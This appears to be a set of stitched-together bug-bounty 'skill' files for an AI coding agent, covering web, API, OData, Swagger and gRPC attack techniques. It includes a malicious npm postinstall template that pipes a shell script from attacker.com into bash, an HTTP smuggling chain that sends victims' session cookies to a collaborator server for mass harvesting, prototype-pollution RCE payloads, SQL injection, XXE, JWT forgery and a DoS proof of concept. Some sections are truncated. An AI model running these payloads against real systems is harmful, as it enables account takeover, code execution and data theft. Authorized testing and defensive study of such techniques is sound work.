- Open redirect: test `next`, `return_url`, `redirect_uri`, `url`, `continue` values and chained OAuth/SSO redirects.
- CSV injection: inspect any spreadsheet export or import feature for fields beginning with `=`, `+`, `-`, `@`.
- Parameter pollution: send duplicate query/form parameters and array/scalar variants to observe parsing/bypass differences.

## 5. Business Logic

- Price manipulation: negative quantities, zero prices, coupon stacking, cart total manipulation.
- Race conditions: concurrent requests to spend the same token/balance/coupon, two-thread checkout race.
- Workflow bypass: skip payment step, access post-checkout page without completing checkout, manipulate order state machine.
- Limit bypass: rate limit bypass via IP rotation headers (`X-Forwarded-For`), account enumeration via response time/message difference.

### 6. Information Disclosure

- Stack traces in error responses. API keys in JS bundles, comments, or git history.
- GraphQL introspection: query `{__schema{types{name}}}` — report if enabled on production.
- Directory listing, backup files (`.bak`, `.old`, `.swp`), `.git/` exposure.
- JWT claims exposing internal user IDs, roles, or infrastructure details.

### 7. File & Upload

- File type bypass: change `Content-Type` to `image/jpeg` while uploading `.php`/`.jsp`. Double extension: `shell.php.jpg`.
- Path traversal in filename: `../../etc/passwd`, `....//....//etc/passwd`.
- Zip slip: craft archive with `../` path entries.
- XXE via SVG/XLSX upload.

### 8. Advanced

- HTTP request smuggling: `CL.TE` and `TE.CL` desync. Test with `Transfer-Encoding: chunked` + `Content-Length` conflict.
- Cache poisoning: inject `X-Forwarded-Host` or `X-Original-URL` to poison CDN cache with malicious content.
- Subdomain takeover: check DNS CNAMEs pointing to unclaimed cloud assets (S3, GitHub Pages, Heroku, Azure).
- WebSocket: test for missing auth on upgrade, message injection, cross-site WebSocket hijacking.

### 9. HTTP Smuggling → Session Hijack (H100 Proven Chain)

This chain appeared 4 times in the top 100 reports and enables mass account takeover.

**Exploitation steps:**
1. Find CL.TE desync on subdomain behind CDN (Akamai, Cloudflare, nginx)
2. Craft smuggled request that forces victim's next request to become your controlled request
3. Smuggled request creates open redirect → victim follows redirect WITH session cookies
4. Redirect target = your collaborator server → steal session cookies
5. Use stolen cookies to impersonate victim → full account access
6. Automate with bots to harvest many sessions simultaneously

**Where to test:**
- Subdomains with "b" suffix or alternate spellings (often less hardened)
- Login/authentication endpoints that issue session cookies
- Any endpoint behind a reverse proxy or CDN

**Testing method:**
```bash

# Send smuggled request with both headers
POST / HTTP/1.1
Host: target-subdomain.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET / HTTP/1.1Host: collaborator.com
```
Monitor Burp Collaborator for incoming requests from other users.

### 10. Cache Poisoning → Stored XSS on Sensitive Pages (H100 Proven Chain)

This chain appeared 2 times in the top 100 reports against a major financial platform.

**Exploitation steps:**
1. Find unkeyed header reflected in response (X-Forwarded-Host, X-Original-URL, X-Rewrite-URL)
2. Verify response is cached (check Cache-Control, CDN headers, X-Cache)
3. Poison cache with XSS payload in the unkeyed header
4. Wait for victim to visit the same URL → served poisoned cached copy
5. XSS executes in victim's browser on the sensitive page (login, dashboard, payment)

**CSP Bypass patterns:**
- Find older JS libraries on scope domains (jQuery < 3.0, Bootstrap < 3.4.1)
- jQuery selector gadget: `<script>` → jQuery converts to DOM element → executes
- 'unsafe-eval' in CSP + jQuery = direct script execution
- Search: `grep -r "jquery" --include="*.js" | sort` on scope domains

**High-value targets for cache poisoning:**
- Login pages — tokens, credentials in context
- Dashboard/admin pages — session tokens, user data
- Payment/checkout pages — financial data
- Settings/profile pages — PII, API keys

### 11. Supply Chain Attacks (H100 Proven — npm/Gem/PyPI)

This chain appeared 2 times in the top 100 reports and enables RCE on target's infrastructure.

**Exploitation steps:**
1. Find target's package dependencies (package.json, Gemfile, requirements.txt in public repos)
2. Extract package names
3. Check if packages exist on public registry (npm, PyPI, RubyGems)
4. If package doesn't exist → publish malicious package with same name
5. Target's CI/CD installs package → arbitrary code execution via postinstall script

**Malicious package template:**
```json
{
  "name": "target-internal-package-name",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://attacker.com/shell.sh | bash"
  }
}
```

**Also check:** GitHub Actions (unpinned actions → impostor commits), Docker base images, Go modules

### 12. Credential Leak Hunting (H100 Proven — 7 reports, $50K+ total)

Leaked credentials in code repos or build artifacts appeared 5 times in the top 100.

**Where to find leaked tokens:**
- Public repos: `gh api -X GET "search/code?q=org:TARGET+filename:.env"`
- Compiled apps: extract .env from Electron .asar files, Android APK, iOS IPA
- Build logs: Travis CI, GitHub Actions logs contain secrets
- Docker images: `docker run --rm -it TARGET/app:latest env`

**Token types that pay:**
- GitHub Personal Access Token (`ghp_`, `github_pat_`) → read/write all org repos
- npm token (`npm_`) → publish to org's npm scope
- AWS Access Key (`AKIA`) → full AWS access
- Slack webhook (`hooks.slack.com`) → post to any channel
- Stripe key (`sk_live_`) → payment processing access

**Validation PoC:**
```bash
curl -H "Authorization: token ghp_xxxxx" https://api.github.com/user

## Local Tool Integration

When local execution is available, use installed CLI tools to expand and verify findings.

- `nmap` for network/service discovery
- `ffuf` / `wfuzz` for endpoint and parameter fuzzing
- `sqlmap` for SQL injection verification
- `gobuster` / `amass` for host and subdomain enumeration
- `curl` / `httpx` for request crafting and PoC reproduction
- `zap` / `burpsuite` for automated scanning and proxy-assisted analysis

Record which tool was used and include minimal evidence commands in the finding output.

## Output Fields

Add to all FINDINGs:

```
endpoint: <method + path, e.g., POST /api/v1/users/{id}>
parameter: <vulnerable parameter or header>
request: |
  <minimal HTTP request reproducing the issue>
response_evidence: <what in the response proves exploitation>
```


### From `hunt-skills/bountyforge/skills/pashov/.github/pull_request_template.md`

## Checklist

- [ ] No API keys, tokens, or sensitive data included
- [ ] No fabricated examples — outputs must reflect real model responses
- [ ] Skill works with Claude Code CLI, VS Code, and Cursor


### From `hunt-skills/bountyforge/skills/pashov/CLAUDE.md`

## What This Repo Is

A library of Claude AI skills. Each skill is a focused, self-contained capability for Claude Code in VS Code and Cursor.

## Structure

```
solidity-auditor/ # Security review of Solidity changes while you develop
CLAUDE.md            # This file (read by Claude Code)
```

## Rules

- One skill, one purpose.
- No fabricated examples - outputs must reflect real model responses.
- No secrets, API keys, or personal data.


### From `hunt-skills/bountyforge/skills/pashov/CONTRIBUTING.md`

## Pull Request Process

1. Fork the repo and create a branch from `main`.
2. Make your changes — attack vectors, agent prompts, report formatting, or documentation.
3. Ensure your branch is up to date with `main` before opening a PR.
4. Do not edit `VERSION` — it is bumped automatically on merge via CI.
5. Fill in the PR template. A maintainer will review within 5 business days.

### PR checklist

- [ ] No API keys, tokens, or sensitive data
- [ ] No fabricated examples — outputs must reflect real model responses
- [ ] Skill works with Claude Code CLI, VS Code, and Cursor

## What to Contribute

- **Attack vectors** — add new vectors to `solidity-auditor/references/attack-vectors/attack-vectors.md` following the existing `**D:**` / `**FP:**` format.
- **Agent prompts** — improve triage accuracy, reduce false positives, tighten output format.
- **Report formatting** — improve the output structure or fix template issues.
- **Bug fixes** — if the skill produces incorrect output, open an issue or PR with a fix.

## Reporting Bugs

Use the [Bug Report](.github/ISSUE_TEMPLATE/bug_report.md) issue template and include:

- Which skill is affected and how you invoked it.
- The Claude model used (e.g., claude-sonnet-4-6).
- The input you gave and the output you got.
- What you expected instead.


### From `hunt-skills/hunt-api-misconfig/SKILL.md`

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor
JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,
or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype
state reaches a later operation.

Hunt sequence:

1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.
   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
2. **Pollute harmless marker properties.** Send variants such as:

```
{"__proto__":{"polluted":"pp-1337"}}
{"constructor":{"prototype":{"polluted":"pp-1337"}}}
__proto__[polluted]=pp-1337
constructor[prototype][polluted]=pp-1337
```

3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render
   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,
   server errors mentioning object properties, changed job output, template/render errors, or command/job
   behavior changes.
4. **Escalate only through learned sinks.** Candidate properties depend on the sink:

```
{"__proto__":{"json spaces":10}}
{"__proto__":{"status":555}}
{"__proto__":{"isAdmin":true,"role":"admin"}}
{"__proto__":{"shell":"/bin/bash","argv0":"node","NODE_OPTIONS":"--inspect"}}
{"__proto__":{"execArgv":["--eval","process.mainModule.require('child_process').execSync('id')"]}}
```

5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,
   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only
   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.

### Server-Side Parameter Pollution in Backend URL / REST URL Construction

Use this when a frontend form or endpoint appears to call a server-side API on your behalf
(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not
ordinary client-side query pollution. The server takes your input and interpolates it into a backend
URL path or query string, such as:

```
/api/internal/users/<username>/field/email
/api/users/<id>
/api/users?username=<username>&field=email
```

Hunt sequence:

1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look
   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.
   If there is a reset/account form, test known usernames first to learn the normal success/error shape.
2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:
   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.
   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned
   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.
3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the
   referenced account, the input is in a REST path segment. Then try appending route fragments such as
   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest
   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.
4. **Discover API documentation from errors.** When an error says to consult the API definition, probe
   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,
   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the
   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources
   and field names.
5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a
   sensitive field such as a reset token or secret for another user, then using that token in the normal
   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing
   feedback.

Payload patterns to try, adapted to the observed parameter name:

```
username=administrator%23
username=administrator%3f
username=administrator%2f..%2fvictimuser
username=administrator/../victimuser
username=administrator/field/email%23
username=administrator/field/id%23
username=administrator/field/passwordResetToken%23
username=administrator%2ffield%2fpasswordResetToken%23
```

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.


### From `hunt-skills/hunt-grpc/SKILL.md`

## Crown Jewel Targets

gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.

**Highest-value findings:**
- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
- **Missing auth on internal service** — a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
- **Edge-auth-only / metadata-stripping** — proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
- **Plaintext gRPC** — gRPC h2c (cleartext HTTP/2) on a non-standard port → credential/metadata interception.
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting → resource exhaustion. **DoS is in scope on almost no program — get explicit written authorization before sending a single burst.**

---

# Common gRPC ports (50051 native; 443/8443 via TLS+ALPN h2; 9090/8080 h2c)
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open

# ALPN must negotiate h2 — gRPC cannot run on HTTP/1.1
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"

# trailer (12 = UNIMPLEMENTED) even when the path is wrong — strong signal it's gRPC.
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status

# TLS-fronted h2 (port 443): look for grpc-status trailer / grpc content-type
curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
  -H "content-type: application/grpc-web+proto" -o /dev/null -D - | grep -i "grpc-status\|content-type"
```

`grpc-status` trailer present ⇒ a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms the transport — not a finding.

---

## Phase 2 — Service Enumeration via Reflection

```bash
brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure  $TARGET:443   list

# List + describe every method of each service
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema

# Dump the whole catalog to triage interesting surfaces
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.

---

# Baseline: call a sensitive method with NO auth metadata
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers

# IDOR across an enumerable id field
for ID in 1 2 3 100 1000 1001; do
  echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
    -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
done
```

**Interpret the gRPC status code, not just whether bytes came back (see Validation):**
- `OK` + populated response → method executed unauthenticated → finding.
- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
- `Unimplemented (12)` → wrong path / method not on this server.
- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.

---

# (a) Forged bearer / alg=none JWT in the authorization metadata
grpcurl -plaintext $TARGET:50051 \
  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \
  -d '{}' admin.AdminService/GetConfig

#     spoofing them = full impersonation. Test every plausible name:
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do
  echo "== $H =="
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
done

#     server; some auth middlewares only inspect text metadata, missing -bin keys.
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
  -d '{}' admin.AdminService/GetConfig
```

The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.

---

# Proxies (Envoy/grpc-gateway) sometimes serve descriptors or swagger
for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do
  S=$(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P")
  [ "$S" != 404 ] && echo "Found: /$P ($S)"
done

# Source/registry leakage of .proto definitions
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20 2>/dev/null
gh search code --owner "$TARGET_ORG" 'service ' filename:.proto --limit 20 2>/dev/null

# Rebuild a descriptor set from leaked protos and drive the API without reflection
protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
```

Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3–4 against a reflection-disabled target.

---

## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding Attacks

gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.

```bash

#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
  -H 'content-type: application/json' -d '{}'    # default unannotated route

#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
MSG=$(xxd -p msg.bin | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
  -d '{"user_id": 1}'

# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh).

---

## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)

**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and a target/window the program owner agreed to. Skip to Validation if unsure.

The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**

**Correct tooling — author-sanctioned PoCs that actually emit the frame pattern:**
```bash

#   https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/  (Cloudflare writeup)

# Go PoC that sends HEADERS then immediate RST_STREAM in a tight loop:
git clone https://github.com/secengjeff/rapidresetclient
cd rapidresetclient && go build -o rapidreset .

# Detection-only: a SHORT, low-count burst, with permission, then STOP:
./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:

# to write a HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
```

**Detection without DoSing — prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:
```bash

# Fingerprint the HTTP/2 implementation and version (patched versions are known):
curl -sI --http2 https://$TARGET/ | grep -i '^server:'

# grpc-go >=1.56.3/1.57.1/1.58.3 are mitigated. Version-match instead of flooding.
```
Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.

---

## Tools

```bash
grpcurl   # primary CLI client (list/describe/call, -protoset for reflection-off)
grpcui    # web UI for interactive exploration:  grpcui -plaintext $TARGET:50051
protoc + protoscope   # build/inspect raw protobuf and gRPC-Web frames (Phase 6)
buf       # lint/inspect proto, drive Connect endpoints

## Chain Table

| gRPC finding | Chain to | Impact |
|--------------|----------|--------|
| Reflection enabled | Enumerate all internal service methods + messages | Full API catalog disclosure (enabler) |
